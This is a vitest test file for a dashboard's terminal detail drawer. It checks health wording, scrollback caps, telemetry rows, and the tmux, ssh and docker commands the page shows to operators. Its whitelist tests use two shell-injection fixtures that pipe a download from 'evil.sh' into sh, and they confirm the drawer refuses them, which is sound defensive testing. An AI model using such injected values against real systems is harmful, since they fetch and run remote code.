/**
 * The detail drawer's document (ADR 0020, slice 7b).
 *
 * The test with security weight is the last describe: a command in a drawer is not executed by the
 * page, and that is exactly why it needs a whitelist — the operator is the interpreter. Everything
 * else pins wording an operator relies on: the four health sentences in the same words the chips use,
 * an unmeasured snapshot age that says `never` rather than `0s ago`, and the mode's stakes.
 */

import { describe, expect, it } from 'vitest';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import DetailDrawer, {
  machineLoad,
  modeOf,
  terminalDetailMarkdown,
  type TerminalDetail,
} from './DetailDrawer';
import { SCROLLBACK_LINES } from './TerminalTile';
import { modeStakes } from './chrome/tileRef';
import type { TerminalHealth } from './panelsClient';

const NOW = 1_754_000_000_000;

const HEALTHY: TerminalHealth = {
  reachable: 'ok',
  session: 'present',
  poller: 'live',
  loads: 'ok',
};

function terminal(over: Partial<TerminalDetail> = {}): TerminalDetail {
  return {
    id: 'fleet:kf-crawl-01/kontra-webcrawl/actor',
    machine: 'kf-crawl-01',
    host: '10.1.2.3',
    publicIp: '203.0.113.7',
    tag: 'crawl',
    fleet: 'kontra-webcrawl-prod',
    actor: 'webcrawl',
    version: '0.3.1',
    window: 'actor',
    health: HEALTHY,
    lastSnapshotAt: NOW - 3_000,
    ...over,
  };
}

describe('what the drawer says about a Terminal', () => {
  const doc = terminalDetailMarkdown({ terminal: terminal(), now: NOW, feed: 'snapshot', elided: 2048 });

  it('names the actor, tag, fleet and the queue its handler polls', () => {
    expect(doc).toContain('webcrawl@0.3.1');
    expect(doc).toContain('| tag | crawl |');
    expect(doc).toContain('| fleet | kontra-webcrawl-prod |');
    // Derived by importing `sharedQueue` from the streamer's own module, not re-derived here.
    expect(doc).toContain('| shared queue | webcrawl-0.3.1 |');
  });

  it('says how old the screen is, in words and as an instant', () => {
    expect(doc).toContain('3s ago');
    expect(doc).toContain('2025-07-31T22:13:17.000Z');
  });

  it('reports elided bytes rather than swallowing them', () => {
    expect(doc).toContain('2.0 KiB dropped by the byte cap');
  });

  it('states the frontend scrollback ring and its cap (slice 05)', () => {
    // Criterion 2: the ring is stated, not left as a magic number in an xterm constructor — and it is
    // named as the frontend's, not tmux copy-mode's.
    expect(doc).toContain('| scrollback | 2,000 lines');
    expect(doc).toContain("this browser's ring, not tmux copy-mode");
    // …and what a reconnect keeps, the design item tmux does not answer.
    expect(doc).toContain('reseeds from a fresh screen');
  });

  it('carries the four health sentences, in the same words the chips use', () => {
    expect(doc).toContain('ssh: reachable');
    expect(doc).toContain('session: present');
    expect(doc).toContain('poller: live');
    expect(doc).toContain('loads: ok');
  });

  it('marks an unmeasured signal as unmeasured, never as fine', () => {
    const unknown = terminalDetailMarkdown({
      terminal: terminal({ health: { ...HEALTHY, poller: 'unknown', loads: 'unknown' } }),
      now: NOW,
    });
    expect(unknown).toContain('poller: unknown (not measured yet)');
    expect(unknown).toContain('_(not measured)_');
  });

  it('says `never` for a Terminal that has produced no screen', () => {
    // Not "0s ago": `heartbeat.ts`'s rule, one layer down. A tile that has never been fed and a tile
    // fed a moment ago are different facts.
    const fresh = terminalDetailMarkdown({ terminal: terminal({ lastSnapshotAt: undefined }), now: NOW });
    expect(fresh).toContain('| last screen | never (unknown) |');
  });

  it('says `none placed` for a Machine the stack carries no actor for', () => {
    const bare = terminalDetailMarkdown({
      terminal: terminal({ actor: '', version: '' }),
      now: NOW,
    });
    expect(bare).toContain('none placed');
    expect(bare).not.toContain('shared queue');
  });

  it('repeats that a Terminal is not a record', () => {
    expect(doc).toContain('The Manifest, the journal on the Machine and the lake are the record');
  });
});

describe('the mode is first-class, and its stakes differ', () => {
  it('reads the mode off the wire, and falls back to the id prefix', () => {
    expect(modeOf(terminal({ mode: undefined }))).toBe('fleet');
    expect(modeOf(terminal({ id: 'local:dev-box/kontra-parse/actor', mode: undefined }))).toBe('local');
    expect(modeOf(terminal({ id: 'not-an-id', mode: undefined }))).toBe('fleet');
  });

  it('says a fleet pane costs the view, IN THE WALL’S OWN WORDS', () => {
    // Asserted against `modeStakes` itself, not against a copy of its sentence. Slice 7a wrote that
    // function to be the single place the UI says this, and a test that duplicated the wording would
    // be the third copy — and the one that keeps a drifted drawer green.
    const doc = terminalDetailMarkdown({ terminal: terminal(), now: NOW });
    expect(doc).toContain(modeStakes('fleet').sentence);
    expect(modeStakes('fleet').level).toBe('view');
  });

  it('says a local pane costs a running Worker', () => {
    const doc = terminalDetailMarkdown({
      terminal: terminal({ id: 'local:dev-box/kontra-parse/actor', machine: 'dev-box', mode: 'local' }),
      now: NOW,
    });
    expect(doc).toContain(modeStakes('local').sentence);
    expect(modeStakes('local').level).toBe('worker');
  });
});

describe('the commands an operator would run themselves', () => {
  it('gives the fleet the capture command the wall uses and the grouped attach slice 2 measured', () => {
    const doc = terminalDetailMarkdown({ terminal: terminal(), now: NOW });
    expect(doc).toContain("tmux capture-pane -p -e -S -50 -t 'kontra-webcrawl:actor'");
    expect(doc).toContain('ssh -t -i "$KONTRA_SSH_KEY" root@10.1.2.3');
    expect(doc).toContain("tmux new-session -A -d -s kp-you -t 'kontra-webcrawl'");
    // THE CORRECTION SLICE 2 MEASURED: select-window targets the VIEWER session. Against the owner it
    // yanks the current window of anyone attached on the Machine and streams the wrong window.
    expect(doc).toContain("tmux select-window -t 'kp-you:actor'");
    expect(doc).toContain('tmux attach-session -r -t kp-you');
    // And the cleanup, because a viewer session outlives its client.
    expect(doc).toContain('tmux kill-session -t kp-you');
  });

  it('uses docker exec for a container, and no ssh', () => {
    const doc = terminalDetailMarkdown({
      terminal: terminal({
        id: 'docker:kontra-webcrawl-0-3-1-1/kontra-webcrawl/actor',
        machine: 'kontra-webcrawl-0-3-1-1',
        mode: 'docker',
      }),
      now: NOW,
    });
    expect(doc).toContain('docker exec kontra-webcrawl-0-3-1-1 tmux capture-pane');
    expect(doc).not.toContain('ssh ');
  });

  it('uses no transport at all for local', () => {
    const doc = terminalDetailMarkdown({
      terminal: terminal({ id: 'local:dev-box/kontra-parse/actor', machine: 'dev-box', mode: 'local' }),
      now: NOW,
    });
    expect(doc).toContain("tmux capture-pane -p -e -S -50 -t 'kontra-parse:actor'");
    expect(doc).not.toContain('ssh ');
    expect(doc).not.toContain('docker exec');
  });

  it('REFUSES to compose a command from an id that is not whitelisted', () => {
    // An id arrives from the streamer, but a page that renders a copyable `ssh` line is a shell
    // injection with the operator as the interpreter. Same patterns the streamer admits ids by.
    const doc = terminalDetailMarkdown({
      terminal: terminal({ id: 'fleet:kf-crawl-01/kontra-webcrawl/$(curl evil.sh|sh)' }),
      now: NOW,
    });
    // NO COMMAND, of any mode. The hostile string is still SHOWN — as prose and as a table cell,
    // which is what an operator diagnosing this needs — so the assertion is about the command block,
    // not about the value's absence.
    expect(doc).not.toContain('capture-pane');
    expect(doc).not.toContain('```sh');
    expect(doc).toContain('its id');
    expect(doc).toContain('is not admitted');
  });

  it('REFUSES when the host is not whitelisted, even though the id parses', () => {
    // `host` comes from the Pulumi inventory rather than from the id, so it gets its own admission.
    const doc = terminalDetailMarkdown({
      terminal: terminal({ host: '10.1.2.3; curl evil.sh | sh' }),
      now: NOW,
    });
    expect(doc).not.toContain('ssh -i');
    expect(doc).not.toContain('```sh');
    // The sentence names WHICH value was refused: an operator sent to the wrong file by a generic
    // message is an operator who concludes the Dashboard is broken.
    expect(doc).toContain('its address');
    expect(doc).toContain('is not admitted');
  });
});

describe('the scrollback ring the browser holds', () => {
  /*
   * SLICE 05, ACCEPTANCE CRITERION 2 — "the frontend holds its own scrollback ring with a stated
   * cap" — asserted on the statement rather than on the function that used to build it. These came
   * off `scrollback.ts`, whose two exports were a number and a sentence about it: the number is now
   * `TerminalTile`'s, because that is what hands it to xterm, and the sentence is written where it
   * is said. What the drawer must never do is state a cap the buffer does not have, and only a test
   * that reads BOTH out of the same document can catch that.
   */

  it('is a concrete number rather than an unbounded buffer', () => {
    expect(SCROLLBACK_LINES).toBe(2_000);
  });

  it('states the cap, and states it as the number xterm was given', () => {
    const doc = terminalDetailMarkdown({ terminal: terminal(), now: NOW });
    expect(doc).toContain(SCROLLBACK_LINES.toLocaleString());
    // Why it is the frontend's job at all: tmux copy-mode is a keyboard feature a read-only pane
    // cannot reach.
    expect(doc.toLowerCase()).toContain('read-only pane');
    expect(doc).toContain('copy-mode');
  });

  it('says what survives a reconnect — the design item tmux does not answer', () => {
    const doc = terminalDetailMarkdown({ terminal: terminal(), now: NOW }).toLowerCase();
    expect(doc).toContain('reconnect');
    // The two halves of "no loss, no duplication": a fresh screen, and no bytes held across the gap.
    expect(doc).toContain('fresh screen');
    expect(doc).toMatch(/replayed|held across|shown twice/);
  });
});

describe('the component around the document', () => {
  it('renders with the hooks a spec can select, and the document inside', () => {
    const html = renderToStaticMarkup(
      createElement(DetailDrawer, { terminal: terminal(), now: NOW, onClose: () => {} })
    );
    expect(html).toContain('data-testid="detail-fleet:kf-crawl-01/kontra-webcrawl/actor"');
    expect(html).toContain('data-testid="detail-close-fleet:kf-crawl-01/kontra-webcrawl/actor"');
    expect(html).toContain('data-testid="detail-markdown-fleet:kf-crawl-01/kontra-webcrawl/actor"');
    expect(html).toContain('kf-crawl-01');
    // Rendered through the same safe renderer as pane content: the commands are a code block, not
    // markup, and nothing in the document became an element.
    expect(html).toContain('<pre');
  });
});

/**
 * The Machine's own numbers, which arrive on `/api/panels/terminals` and nowhere else (ADR 0037).
 *
 * ═══ THE CONTROL COMES FIRST ═══
 *
 * "An unmeasured reading does not appear" passes against a drawer that never renders telemetry at
 * all, so the first assertion here is that a measured one DOES.
 */
describe('telemetry from the Machine’s Warden', () => {
  it('renders cpu, memory and load as one row', () => {
    const doc = terminalDetailMarkdown({
      terminal: terminal({ telemetry: { cpu: 0.42, memory: 0.31, load1: 1.25 } }),
      now: NOW,
    });
    expect(doc).toContain('machine load');
    expect(doc).toContain('cpu 42%, memory 31%, load 1.25');
    // It says WHERE it came from. A number on this page that looks like the browser measured it is
    // the same confusion `StatusBar.tsx` records about snapshot age.
    expect(doc).toContain("this Machine's Warden");
  });

  it('omits the row entirely when nobody measured, rather than drawing a dash', () => {
    // `types.ts`: "`unknown` is a value, never a shrug." A `—` beside "cpu" reads as zero, and a
    // Machine with no Warden is not a Machine that is idle.
    expect(terminalDetailMarkdown({ terminal: terminal(), now: NOW })).not.toContain('machine load');
    expect(machineLoad(undefined)).toBeUndefined();
    expect(machineLoad({})).toBeUndefined();
  });

  it('shows a reading of zero, because zero is a reading', () => {
    // The check is on the field's PRESENCE, never on its truthiness — an idle Machine really does
    // report `cpu: 0`, and a falsy check would hide exactly the Machine an operator is looking for
    // when they wonder why nothing is happening.
    expect(machineLoad({ cpu: 0, load1: 0 })).toContain('cpu 0%');
    expect(machineLoad({ cpu: 0, load1: 0 })).toContain('load 0.00');
  });

  it('renders only the fields that were measured', () => {
    const only = machineLoad({ load1: 3 });
    expect(only).toContain('load 3.00');
    expect(only).not.toContain('cpu');
    expect(only).not.toContain('memory');
  });
});
